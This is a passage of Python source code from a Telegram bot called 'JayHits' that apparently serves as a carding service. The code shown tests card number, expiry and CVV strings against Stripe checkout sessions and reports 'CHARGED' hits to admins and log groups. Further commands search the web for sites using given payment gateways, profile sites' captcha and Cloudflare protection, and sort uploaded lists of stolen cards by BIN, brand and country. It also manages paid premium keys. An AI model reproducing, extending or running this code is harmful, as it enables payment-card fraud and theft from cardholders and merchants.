                                f"\U0001f4b3 **Card:** `{cc}|{mm}|{yy}|{cvv}`\n"
                                f"\u26a1 **Gateway:** Stripe Checkout Hitter\n"
                                f"\u2705 **Response:** {msg}\n"
                                f"\U0001f310 **Site:** {site_name}\n"
                                f"\U0001f464 **User:** [{sender_name}](tg://user?id={user_id})\n"
                                f"\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501"
                            )
                            await event.client.send_message(aid, admin_msg)
                        except:
                            pass
                except:
                    pass
                try:
                    _site_visible = get_bool_setting("HITTER_SITE_VISIBLE", True)
                    _site_name_log = (session_cache or {}).get("merchant", "Stripe Checkout")
                    _display_site = _site_name_log if _site_visible else "Hidden From User"
                    _hit_amount = (session_cache or {}).get("amount")
                    _hit_currency = (session_cache or {}).get("currency")
                    _amount_str = None
                    if _hit_amount and _hit_currency:
                        try:
                            _amount_str = f"{int(_hit_amount)/100:.2f} {_hit_currency.upper()}"
                        except Exception:
                            pass
                    _sender = await event.get_sender()
                    _sname = (getattr(_sender, 'first_name', '') or '').strip()
                    if getattr(_sender, 'last_name', ''):
                        _sname += f" {_sender.last_name}"
                    _sname = _sname.strip() or str(user_id)
                    asyncio.create_task(asyncio.to_thread(
                        send_bot_group_log, _sname, user_id, f"{cc}|{mm}|{yy}|{cvv}",
                        "Stripe Checkout Hitter", msg, "CHARGED",
                        site=_display_site, amount=_amount_str
                    ))
                except Exception:
                    pass
            elif status in ("3ds", "live"):
                icon = "\u26a0\ufe0f"
                label = "3DS Required"
            elif status == "live_declined":
                icon = "\u274c"
                label = "Declined"
            elif status == "error":
                icon = "\u26a0\ufe0f"
                label = "Error"
            else:
                icon = "\u274c"
                label = "Failed"

            card_results.append({
                "cc": f"{cc}|{mm}|{yy}|{cvv}",
                "status": label,
                "icon": icon,
                "msg": msg,
                "gateway": cc_data.get("gateway", "?"),
            })

            if hit_found:
                break

        merchant = (session_cache or {}).get("merchant", "")
        amount = (session_cache or {}).get("amount", "")
        currency = (session_cache or {}).get("currency", "")

        amount_line = ""
        if amount and currency:
            try:
                amt_float = int(amount) / 100
                amount_line = f"\nAmount: {amt_float:.2f} {currency}"
            except:
                amount_line = f"\nAmount: {amount} {currency}"

        if hit_found:
            header = "\U0001f525 **Auto Hit - CHARGED!**"
        elif stopped:
            header = "\U0001f6d1 **Auto Hit - Stopped**"
        else:
            header = "\u274c **Auto Hit - No Hits**"

        result_lines = []
        for r in card_results:
            result_lines.append(f"{r['icon']} `...{r['cc'].split('|')[0][-4:]}` ({r['gateway']}) \u2014 {r['status']}: {r['msg'][:50]}")

        final_text = (
            f"{header}\n\n"
            f"Tried: **{processed}/{total}** CCs"
            f"{amount_line}\n"
            f"{f'Site: {merchant}' if merchant else ''}\n\n"
            + "\n".join(result_lines)
        )

        try:
            await progress_msg.edit(final_text, buttons=None)
        except:
            await event.reply(final_text)

    except Exception as e:
        await event.reply(f"Hit Error: {e}")
    finally:
        ACTIVE_HIT_PROCESSES.pop(user_id, None)

@client.on(events.NewMessage(pattern=r'(?i)^[/]url\b'))
async def url_cmd(event):
    if await is_banned_user(event.sender_id):
        return await event.reply(banned_user_message())
    allowed, access_type = await can_use(event.sender_id, event.chat)
    if not allowed:
        return await event.reply(not_authorized_message())

    text = event.raw_text.strip()
    parts = text.split(None, 1)
    if len(parts) < 2:
        return await event.reply(
            "\U0001f50d **Gateway Analyzer**\n\n"
            "**Usage:** `/url <website>`\n\n"
            "**Examples:**\n"
            "`/url example.com`\n"
            "`/url https://shop.example.com`\n\n"
            "Analyzes gateways, captcha, cloudflare,\n"
            "SSL, security headers, CMS & more."
        )

    url_input = parts[1].strip()
    msg = await event.reply("\U0001f50d **Analyzing website...**\nPlease wait...")

    try:
        from gates.site_analyzer import analyze_site, format_result
        user = await event.get_sender()
        username = user.username or ""
        data = await analyze_site(url_input)
        result = format_result(data, username)
        await msg.edit(result)
    except Exception as e:
        await msg.edit(f"**Analysis Failed**\n\nError: {str(e)[:100]}")


@client.on(events.NewMessage(pattern=r'(?i)^[/]findsite\b'))
async def findsite_cmd(event):
    if await is_banned_user(event.sender_id):
        return await event.reply(banned_user_message())
    allowed, access_type = await can_use(event.sender_id, event.chat)
    if not allowed:
        return await event.reply(not_authorized_message())
    tool_ok, tool_msg = await check_tool_access("findsite", event.sender_id)
    if not tool_ok: return await event.reply(tool_msg)

    text = event.raw_text.strip()
    parts = text.split(None, 1)

    from gates.site_finder import SUPPORTED_GATEWAYS

    if len(parts) < 2:
        gw_list = ", ".join(sorted(SUPPORTED_GATEWAYS))
        return await event.reply(
            "\U0001f50d **Site Finder**\n\n"
            "**Usage:** `/findsite <gateway> [count]`\n\n"
            "**Examples:**\n"
            "`/findsite stripe`\n"
            "`/findsite braintree 5`\n"
            "`/findsite razorpay 15`\n\n"
            f"**Supported:** {gw_list}\n\n"
            "Searches the web for sites using the\n"
            "specified payment gateway."
        )

    args = parts[1].strip().split()
    gateway = args[0].lower()
    max_results = 10
    if len(args) > 1:
        try:
            max_results = min(max(int(args[1]), 1), 25)
        except ValueError:
            pass

    if gateway not in SUPPORTED_GATEWAYS and gateway not in [g.lower() for g in SUPPORTED_GATEWAYS]:
        gw_list = ", ".join(sorted(SUPPORTED_GATEWAYS))
        return await event.reply(
            f"\u274c Unknown gateway: **{gateway}**\n\n"
            f"**Supported:** {gw_list}"
        )

    msg = await event.reply(
        f"\U0001f50d **Finding {gateway.title()} sites...**\n"
        f"Searching web & verifying gateways...\n"
        f"This may take a moment."
    )

    try:
        from gates.site_finder import find_sites, format_finder_result

        async def progress(text):
            try:
                await msg.edit(f"\U0001f50d **Site Finder**\n\n{text}")
            except Exception:
                pass

        user = await event.get_sender()
        username = user.username or ""
        data = await find_sites(gateway, max_results=max_results, progress_callback=progress)
        result = format_finder_result(data, username)
        await msg.edit(result)
    except Exception as e:
        await msg.edit(f"**Site Finder Failed**\n\nError: {str(e)[:100]}")


@client.on(events.NewMessage(pattern='/info'))
async def info(event):
    if await is_banned_user(event.sender_id): return await event.reply(banned_user_message())
    user = await event.get_sender()
    user_id = event.sender_id
    first_name = user.first_name or "N/A"
    last_name = user.last_name or ""
    full_name = f"{first_name} {last_name}".strip()
    username = f"@{user.username}" if user.username else "N/A"
    has_premium = await is_premium_user(user_id)
    premium_status = "Premium Access" if has_premium else "No Premium Access"
    rank = await get_user_rank(user_id)
    sites = await load_json(SITE_FILE)
    user_sites = sites.get(str(user_id), [])
    info_text = f"""**JayHits - User Information**

**Name:** {full_name}
**Username:** {username}
**User ID:** `{user_id}`
**Rank:** **{rank}**
**Private Access:** {premium_status}

**Your Sites:** {len(user_sites)}
"""
    info_text += f"\n\n**Bot:** {BOT_USERNAME or ADMIN_USERNAME}"
    await event.reply(info_text)

@client.on(events.NewMessage(pattern='/stats'))
async def stats(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("Only Admin Can Use This Command!")
    try:
        premium_users = await load_json(PREMIUM_FILE)
        free_users = await load_json(FREE_FILE)
        user_sites = await load_json(SITE_FILE)
        keys_data = await load_json(KEYS_FILE)
        stats_content = "JayHits - STATISTICS REPORT\n"
        stats_content += "=" * 50 + "\n\n"
        current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        stats_content += f"Generated on: {current_time}\n\n"
        stats_content += "USER STATISTICS\n"
        stats_content += "-" * 30 + "\n"
        all_user_ids = set()
        all_user_ids.update(premium_users.keys())
        all_user_ids.update(free_users.keys())
        all_user_ids.update(user_sites.keys())
        total_users = len(all_user_ids)
        total_premium = len(premium_users)
        total_free = total_users - total_premium
        stats_content += f"Total Unique Users: {total_users}\n"
        stats_content += f"Premium Users: {total_premium}\n"
        stats_content += f"Free Users: {total_free}\n\n"
        if premium_users:
            stats_content += "PREMIUM USERS DETAILS\n"
            stats_content += "-" * 30 + "\n"
            for user_id, user_data in premium_users.items():
                expiry_date = datetime.datetime.fromisoformat(user_data['expiry'])
                current_date = datetime.datetime.now()
                status = "ACTIVE" if current_date <= expiry_date else "EXPIRED"
                days_remaining = (expiry_date - current_date).days if current_date <= expiry_date else 0
                stats_content += f"User ID: {user_id}\n"
                stats_content += f"  Status: {status}\n"
                stats_content += f"  Days Given: {user_data.get('days', 'N/A')}\n"
                stats_content += f"  Added By: {user_data.get('added_by', 'N/A')}\n"
                stats_content += f"  Expires: {expiry_date.strftime('%Y-%m-%d %H:%M:%S')}\n"
                stats_content += f"  Days Remaining: {days_remaining}\n"
                stats_content += "-" * 20 + "\n"
        stats_content += "\nSITES STATISTICS\n"
        stats_content += "-" * 30 + "\n"
        total_sites_count = sum(len(s) for s in user_sites.values())
        users_with_sites = len([uid for uid, s in user_sites.items() if s])
        stats_content += f"Total Sites Added: {total_sites_count}\n"
        stats_content += f"Users with Sites: {users_with_sites}\n"
        if user_sites:
            stats_content += f"\nSites per User:\n"
            for uid, s in user_sites.items():
                if s:
                    stats_content += f"  User {uid}: {len(s)} sites\n"
                    for site in s:
                        stats_content += f"    - {site}\n"
        stats_content += f"\nKEYS STATISTICS\n"
        stats_content += "-" * 30 + "\n"
        total_keys = len(keys_data)
        used_keys = len([k for k, v in keys_data.items() if v.get('used', False)])
        unused_keys = total_keys - used_keys
        stats_content += f"Total Keys Generated: {total_keys}\n"
        stats_content += f"Used Keys: {used_keys}\n"
        stats_content += f"Unused Keys: {unused_keys}\n"
        if keys_data:
            stats_content += f"\nKeys Details:\n"
            for key, key_data in keys_data.items():
                status = "USED" if key_data.get('used', False) else "UNUSED"
                used_by = key_data.get('used_by', 'N/A')
                days = key_data.get('days', 'N/A')
                created = key_data.get('created_at', 'N/A')
                used_at = key_data.get('used_at', 'N/A')
                stats_content += f"  Key: {key}\n"
                stats_content += f"    Status: {status}\n"
                stats_content += f"    Days Value: {days}\n"
                stats_content += f"    Created: {created}\n"
                if status == "USED":
                    stats_content += f"    Used By: {used_by}\n"
                    stats_content += f"    Used At: {used_at}\n"
                stats_content += "-" * 15 + "\n"
        stats_content += f"\nADMIN STATISTICS\n"
        stats_content += "-" * 30 + "\n"
        stats_content += f"Total Admins: {len(ADMIN_ID)}\n"
        stats_content += f"Admin IDs: {', '.join(map(str, ADMIN_ID))}\n"
        if os.path.exists(CC_FILE):
            try:
                async with aiofiles.open(CC_FILE, "r", encoding="utf-8") as f:
                    cc_content = await f.read()
                cc_lines = cc_content.strip().split('\n') if cc_content.strip() else []
                approved_cards = len([line for line in cc_lines if 'APPROVED' in line])
                charged_cards = len([line for line in cc_lines if 'CHARGED' in line])
                stats_content += f"\nCARD STATISTICS\n"
                stats_content += "-" * 30 + "\n"
                stats_content += f"Total Processed Cards: {len(cc_lines)}\n"
                stats_content += f"Approved Cards: {approved_cards}\n"
                stats_content += f"Charged Cards: {charged_cards}\n"
            except:
                pass
        stats_content += "\n" + "=" * 50 + "\n"
        stats_content += "END OF REPORT"
        stats_filename = f"bot_stats_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        async with aiofiles.open(stats_filename, "w", encoding="utf-8") as f:
            await f.write(stats_content)
        await event.reply("Bot statistics report generated!", file=stats_filename)
        os.remove(stats_filename)
    except Exception as e:
        await event.reply(f"Error generating stats: {e}")

@client.on(events.NewMessage(pattern='/unauth'))
async def unauth_user(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("Only Admin Can Use This Command!")
    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await event.reply("Format: /unauth {user_id}")
        user_id = int(parts[1])
        if not await is_premium_user(user_id):
            return await event.reply(f"User {user_id} does not have premium access!")
        success = await remove_premium_user(user_id)
        if success:
            await event.reply(f"Premium access removed for user {user_id}!")
            try: await client.send_message(user_id, f"Your Premium Access Has Been Revoked!\n\nYou can no longer use the bot in private chat.\n\nFor inquiries, contact {ADMIN_USERNAME}")
            except: pass
        else:
            await event.reply(f"Failed to remove access for user {user_id}")
    except ValueError:
        await event.reply("Invalid user ID!")
    except Exception as e:
        await event.reply(f"Error: {e}")

@client.on(events.NewMessage(pattern='/ban'))
async def ban_user_command(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("Only Admin Can Use This Command!")
    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await event.reply("Format: /ban {user_id}")
        user_id = int(parts[1])
        if await is_banned_user(user_id):
            return await event.reply(f"User {user_id} is already banned!")
        await remove_premium_user(user_id)
        await ban_user(user_id, event.sender_id)
        await event.reply(f"User {user_id} has been banned!")
        try: await client.send_message(user_id, f"You Have Been Banned!\n\nYou are no longer able to use this bot in private or group chat.\n\nFor appeal, contact {ADMIN_USERNAME}")
        except: pass
    except ValueError:
        await event.reply("Invalid user ID!")
    except Exception as e:
        await event.reply(f"Error: {e}")

@client.on(events.NewMessage(pattern='/unban'))
async def unban_user_command(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("Only Admin Can Use This Command!")
    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await event.reply("Format: /unban {user_id}")
        user_id = int(parts[1])
        if not await is_banned_user(user_id):
            return await event.reply(f"User {user_id} is not banned!")
        success = await unban_user(user_id)
        if success:
            await event.reply(f"User {user_id} has been unbanned!")
            try: await client.send_message(user_id, f"You Have Been Unbanned!\n\nYou can now use this bot again in groups.\n\nFor private access, you will need to purchase a new key.")
            except: pass
        else:
            await event.reply(f"Failed to unban user {user_id}")
    except ValueError:
        await event.reply("Invalid user ID!")
    except Exception as e:
        await event.reply(f"Error: {e}")

@client.on(events.NewMessage(pattern='/fix_json'))
async def fix_json_corruption(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("Only Admin Can Use This Command!")
    try:
        files_to_fix = [SITE_FILE, PREMIUM_FILE, FREE_FILE, KEYS_FILE, BANNED_FILE]
        results = []
        for filename in files_to_fix:
            if os.path.exists(filename):
                data = await load_json(filename)
                results.append(f"{filename}: Repaired ({len(data)} entries)")
            else:
                results.append(f"{filename}: Does not exist")
        await event.reply("**JSON Repair Results:**\n\n" + "\n".join(results))
    except Exception as e:
        await event.reply(f"Error: {e}")

@client.on(events.NewMessage(pattern='/emergency_repair'))
async def emergency_repair(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("Admin only!")
    msg = await event.reply("**EMERGENCY JSON REPAIR IN PROGRESS**\n\nThis may take a moment...")
    files_to_repair = [SITE_FILE, PREMIUM_FILE, FREE_FILE, KEYS_FILE, BANNED_FILE]
    results = []
    for filename in files_to_repair:
        if os.path.exists(filename):
            size = os.path.getsize(filename)
            async with aiofiles.open(filename, 'r') as f:
                preview = await f.read(100)
            original_data = await load_json(filename)
            await save_json(filename, original_data)
            new_size = os.path.getsize(filename)
            status = "REPAIRED" if size != new_size else "CLEAN"
            results.append(f"{status} `{filename}` ({len(original_data)} entries)")
        else:
            results.append(f"MISSING `{filename}`")
    backup_files = [f for f in os.listdir('.') if f.endswith('.corrupted_backup_')]
    for backup in backup_files[:10]:
        try:
            os.remove(backup)
        except:
            pass
    report = "**EMERGENCY REPAIR COMPLETE**\n\n" + "\n".join(results)
    report += f"\n\n**Cleanup:** Removed {len(backup_files) - min(10, len(backup_files))} old backups"
    report += "\n\n**Bot should now function normally.**"
    try: await msg.edit(report)
    except: await event.reply(report)

def _detect_card_brand(cc):
    if not cc or len(cc) < 4:
        return "Other"
    try:
        p2 = cc[:2]
        p4 = int(cc[:4])
    except (ValueError, IndexError):
        return "Other"
    if cc[0] == "4":
        return "Visa"
    elif p2 in ("51","52","53","54","55") or 2221 <= p4 <= 2720:
        return "Mastercard"
    elif p2 in ("34","37"):
        return "Amex"
    elif cc[:4] in ("6011","6521","6522") or p2 == "65" or cc[:3] == "644":
        return "Discover"
    elif 3528 <= p4 <= 3589:
        return "JCB"
    elif cc[:4] in ("3000","3001","3095") or p2 in ("36","38"):
        return "Diners"
    elif cc[:4] in ("6304","6759","6761","6762","6763"):
        return "Maestro"
    elif p2 == "62":
        return "UnionPay"
    return "Other"

_FAST_CC_RE = re.compile(r'^(\d{12,19})[|/;:,\s]+(\d{1,2})[|/;:,\s]+(\d{2,4})[|/;:,\s]+(\d{3,4})')
BIN_CACHE_FILE = os.path.join(os.path.dirname(__file__), "bin_cache.json")

def _load_bin_cache():
    if os.path.exists(BIN_CACHE_FILE):
        try:
            with open(BIN_CACHE_FILE, 'r') as f:
                data = json.load(f)
            for k, v in data.items():
                if k not in _bin_cache:
                    _bin_cache[k] = tuple(v)
        except:
            pass

def _save_bin_cache():
    try:
        to_save = {k: list(v) for k, v in _bin_cache.items()}
        with open(BIN_CACHE_FILE, 'w') as f:
            json.dump(to_save, f)
    except:
        pass

_load_bin_cache()

async def _bulk_lookup_bins(bins_list, msg=None):
    if not bins_list:
        return
    total_bins = len(bins_list)
    session = await get_http_session()
    sem = asyncio.Semaphore(150)
    done_count = [0]
    last_edit = [time.time()]
    async def _lookup_bin(b):
        async with sem:
            try:
                async with session.get(f"https://bins.antipublic.cc/bins/{b}", timeout=aiohttp.ClientTimeout(total=3)) as res:
                    if res.status == 200:
                        data = json.loads(await res.text())
                        _bin_cache[b] = (data.get('brand', '-'), data.get('type', '-'), data.get('level', '-'), data.get('bank', '-'), data.get('country_name', '-'), data.get('country_flag', ''))
                    else:
                        _bin_cache[b] = ('-', '-', '-', '-', '-', '')
            except:
                _bin_cache[b] = ('-', '-', '-', '-', '-', '')
            done_count[0] += 1
            if msg:
                now = time.time()
                if now - last_edit[0] > 2.0 and done_count[0] < total_bins:
                    last_edit[0] = now
                    pct = int(done_count[0] / total_bins * 100)
                    try:
                        await msg.edit(f"Looking up {total_bins} BINs ({pct}%)...")
                    except:
                        pass
    await asyncio.gather(*[_lookup_bin(b) for b in bins_list])
    _save_bin_cache()

@client.on(events.NewMessage(pattern=r'(?i)^[/]filter$'))
async def filter_cmd(event):
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned":
        return await event.reply(banned_user_message())
    if not can_access:
        msg, buttons = access_denied_message_with_button()
        return await event.reply(msg, buttons=buttons)

    if not event.reply_to_msg_id:
        return await event.reply("Reply to a `.txt` file with `/filter` to filter CCs.")
    replied_msg = await event.get_reply_message()
    if not replied_msg or not replied_msg.document:
        return await event.reply("Reply to a `.txt` file with `/filter` to filter CCs.")

    t0 = time.time()
    msg = await event.reply("Parsing cards...")
    file_path = await replied_msg.download_media()
    try:
        async with aiofiles.open(file_path, "r") as f:
            raw = await f.read()
        os.remove(file_path)
    except Exception as e:
        try:
            os.remove(file_path)
        except:
            pass
        return await msg.edit(f"Error reading file: {e}")

    cards = []
    by_bin = {}
    by_type = {}
    for line in raw.splitlines():
        m = _FAST_CC_RE.match(line.strip())
        if m:
            cc_num, mm, yy, cvv = m.group(1), m.group(2).zfill(2), m.group(3), m.group(4)
            if len(yy) == 4:
                yy = yy[2:]
            card_str = f"{cc_num}|{mm}|{yy}|{cvv}"
            cards.append(card_str)
            b6 = cc_num[:6]
            by_bin.setdefault(b6, []).append(card_str)
            brand = _detect_card_brand(cc_num)
            by_type.setdefault(brand, []).append(card_str)
    if not cards:
        return await msg.edit("No valid CCs found in the file.")

    uid = str(event.sender_id)

    sorted_bin = sorted(by_bin.items(), key=lambda x: -len(x[1]))
    sorted_type = sorted(by_type.items(), key=lambda x: -len(x[1]))
    idx_bin = {str(i): (k, v) for i, (k, v) in enumerate(sorted_bin)}
    idx_type = {str(i): (k, v) for i, (k, v) in enumerate(sorted_type)}

    FILTER_CACHE[uid] = {
        "cards": cards,
        "country": None,
        "bin": idx_bin,
        "type": idx_type,
        "by_bin_raw": by_bin,
    }

    elapsed = round(time.time() - t0, 1)
    sep = "\u2500" * 24
    text = (
        f"**CC Filter** ({elapsed}s)\n{sep}\n\n"
        f"**Total CCs:** {len(cards)}\n"
        f"**Unique BINs:** {len(by_bin)}\n"
        f"**Types:** {', '.join(by_type.keys())}\n\n"
        f"Select a filter below:"
    )
    buttons = [
        [Button.inline(f"By Country (load)", f"fc_{uid}_country_0".encode())],
        [Button.inline(f"By BIN ({len(by_bin)})", f"fc_{uid}_bin_0".encode())],
        [Button.inline(f"By Type ({len(by_type)})", f"fc_{uid}_type_0".encode())],
    ]
    await msg.edit(text, buttons=buttons)

FILTER_PAGE_SIZE = 20

def _filter_main_buttons(uid, cache):
    sep = "\u2500" * 24
    country_data = cache.get('country')
    country_label = f"By Country ({len(country_data)})" if country_data else "By Country (load)"
    text = (
        f"**CC Filter**\n{sep}\n\n"
        f"**Total CCs:** {len(cache['cards'])}\n"
        f"**Unique BINs:** {len(cache['bin'])}\n"
        f"**Types:** {', '.join(entry[0] for entry in cache['type'].values())}\n\n"
        f"Select a filter below:"
    )
    buttons = [
        [Button.inline(country_label, f"fc_{uid}_country_0".encode())],
        [Button.inline(f"By BIN ({len(cache['bin'])})", f"fc_{uid}_bin_0".encode())],
        [Button.inline(f"By Type ({len(cache['type'])})", f"fc_{uid}_type_0".encode())],
    ]
    return text, buttons

async def _build_country_index(cache, msg=None):
    by_bin_raw = cache.get("by_bin_raw", {})
    all_bins = list(by_bin_raw.keys())
    bins_to_lookup = [b for b in all_bins if b not in _bin_cache]
    if bins_to_lookup:
        if msg:
            try:
                await msg.edit(f"Looking up {len(bins_to_lookup)} BINs for country data...")
            except:
                pass
        await _bulk_lookup_bins(bins_to_lookup, msg)
    by_country = {}
    for b6, card_list in by_bin_raw.items():
        info = _bin_cache.get(b6, ('-', '-', '-', '-', '-', ''))
        country = info[4] if info[4] and info[4] != '-' else "Unknown"
        flag = info[5] if info[5] else ""
        key_country = f"{flag} {country}".strip()
        by_country.setdefault(key_country, []).extend(card_list)
    sorted_country = sorted(by_country.items(), key=lambda x: -len(x[1]))
    idx_country = {str(i): (k, v) for i, (k, v) in enumerate(sorted_country)}
    cache["country"] = idx_country
    return idx_country

@client.on(events.CallbackQuery(pattern=rb'^fc_(\d+)_(country|bin|type)_(\d+)$'))
async def filter_cat_cb(event):
    m = re.match(rb'^fc_(\d+)_(country|bin|type)_(\d+)$', event.data)
    uid = m.group(1).decode()
    cat = m.group(2).decode()
    page = int(m.group(3).decode())
    if str(event.sender_id) != uid and event.sender_id not in ADMIN_ID:
        return await event.answer("Not your filter.", alert=True)
    cache = FILTER_CACHE.get(uid)
    if not cache:
        return await event.answer("Filter expired. Run /filter again.", alert=True)

    if cat == "country" and cache.get("country") is None:
        await event.answer("Loading country data...", alert=False)
        msg = await event.get_message()
        await _build_country_index(cache, msg)

    idx_data = cache[cat]
    if idx_data is None:
        return await event.answer("Data not available.", alert=True)
    total = len(idx_data)
    start = page * FILTER_PAGE_SIZE
    end = start + FILTER_PAGE_SIZE
    labels = {"country": "Country", "bin": "BIN", "type": "Type"}
    sep = "\u2500" * 24
    page_count = max(1, (total + FILTER_PAGE_SIZE - 1) // FILTER_PAGE_SIZE)
    text = f"**Filter by {labels[cat]}** ({total} total)\n{sep}\nPage {page + 1}/{page_count}\n\nSelect one:"
    buttons = []
    keys_sorted = sorted(idx_data.keys(), key=int)
    page_keys = keys_sorted[start:end]
    row = []
    for idx in page_keys:
        key_name, ccs = idx_data[idx]
        label = f"{key_name} ({len(ccs)})"
        if len(label) > 20:
            label = label[:17] + "..."
        row.append(Button.inline(label, f"fs_{uid}_{cat}_{idx}".encode()))
        if len(row) == 3:
            buttons.append(row)
            row = []
    if row:
        buttons.append(row)
    nav = []
    if page > 0:
        nav.append(Button.inline("< Prev", f"fc_{uid}_{cat}_{page - 1}".encode()))
    if end < total:
        nav.append(Button.inline("Next >", f"fc_{uid}_{cat}_{page + 1}".encode()))
    if nav:
        buttons.append(nav)
    buttons.append([Button.inline("Back", f"fb_{uid}".encode())])
    await event.edit(text, buttons=buttons)

@client.on(events.CallbackQuery(pattern=rb'^fs_(\d+)_(country|bin|type)_(\d+)$'))
async def filter_sel_cb(event):
    m = re.match(rb'^fs_(\d+)_(country|bin|type)_(\d+)$', event.data)
    uid = m.group(1).decode()
    cat = m.group(2).decode()
    idx = m.group(3).decode()
    if str(event.sender_id) != uid and event.sender_id not in ADMIN_ID:
        return await event.answer("Not your filter.", alert=True)
    cache = FILTER_CACHE.get(uid)
    if not cache:
        return await event.answer("Filter expired. Run /filter again.", alert=True)
    idx_data = cache[cat]
    entry = idx_data.get(idx)
    if not entry:
        return await event.answer("No cards found for this filter.", alert=True)
    await event.answer()
    key_name, matched = entry

    sep = "\u2500" * 24
    labels = {"country": "Country", "bin": "BIN", "type": "Type"}
    header = f"**{labels[cat]}: {key_name}**\n**Cards: {len(matched)}**\n{sep}\n\n"

    if len(matched) <= 50:
        cc_text = "\n".join(f"`{c}`" for c in matched)
        full_text = header + cc_text
        if len(full_text) > 4000:
            file_content = "\n".join(matched)
            tmp = os.path.join(tempfile.gettempdir(), f"filter_{uid}_{cat}_{int(time.time())}.txt")
            async with aiofiles.open(tmp, "w") as f:
                await f.write(file_content)
            await event.respond(header + f"Too many to display. Sent as file.", file=tmp)
            try:
                os.remove(tmp)
            except:
                pass
        else:
            await event.respond(full_text)
    else:
        file_content = "\n".join(matched)
        tmp = os.path.join(tempfile.gettempdir(), f"filter_{uid}_{cat}_{int(time.time())}.txt")
        async with aiofiles.open(tmp, "w") as f:
            await f.write(file_content)
        await event.respond(header + f"Sent {len(matched)} cards as file.", file=tmp)
        try:
            os.remove(tmp)
        except:
            pass

@client.on(events.CallbackQuery(pattern=rb'^fb_(\d+)$'))
async def filter_back_cb(event):
    m = re.match(rb'^fb_(\d+)$', event.data)
    uid = m.group(1).decode()
    if str(event.sender_id) != uid and event.sender_id not in ADMIN_ID:
        return await event.answer("Not your filter.", alert=True)
    cache = FILTER_CACHE.get(uid)
    if not cache:
        return await event.answer("Filter expired. Run /filter again.", alert=True)
    text, buttons = _filter_main_buttons(uid, cache)
    await event.edit(text, buttons=buttons)

@client.on(events.NewMessage(outgoing=True))
async def _group_autodelete_outgoing(event):
    if event.is_group:
        try:
            _logs_gid = get_setting("LOGS_GROUP_ID").strip()
            if _logs_gid and str(event.chat_id) == _logs_gid:
                return
        except Exception:
            pass
        asyncio.create_task(auto_delete_message(event.message, AUTO_DELETE_DELAY))

async def main():
    await initialize_files()
    print("JayHits BOT RUNNING")
    for fname in os.listdir():
        if fname.startswith("temp_sites_") and fname.endswith(".json"):
            try:
                async with aiofiles.open(fname, "r") as f:
                    data = json.loads(await f.read())
                    if time.time() > data.get("expiry", 0):
                        os.remove(fname)
            except:
                try:
                    os.remove(fname)
                except:
                    pass
    try:
        print("Testing connection to Telegram...")
        await client.start(bot_token=BOT_TOKEN)
        me = await client.get_me()
        global BOT_USERNAME
        BOT_USERNAME = f"@{me.username}" if me.username else ADMIN_USERNAME
        set_bot_username(BOT_USERNAME)
        print(f"Bot started successfully as {BOT_USERNAME}")
        for admin_id in ADMIN_ID:
            try:
                await client.send_message(admin_id, "JayHits Bot started successfully!")
            except:
                pass
        print("Bot is now running...")
        await client.run_until_disconnected()
    except Exception as e:
        print(f"Error starting bot: {e}")
        print("Trying to reconnect in 10 seconds...")
        await asyncio.sleep(10)
        await main()

if __name__ == "__main__":
    if sys.platform.startswith('win'):
        asyncio.set_event_loop_policy(asyncio.WindowsProactorEventLoopPolicy())
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("Bot stopped by user")
    except Exception as e:
        print(f"Fatal error: {e}")
        print("Restarting in 5 seconds...")
        time.sleep(5)
        asyncio.run(main())
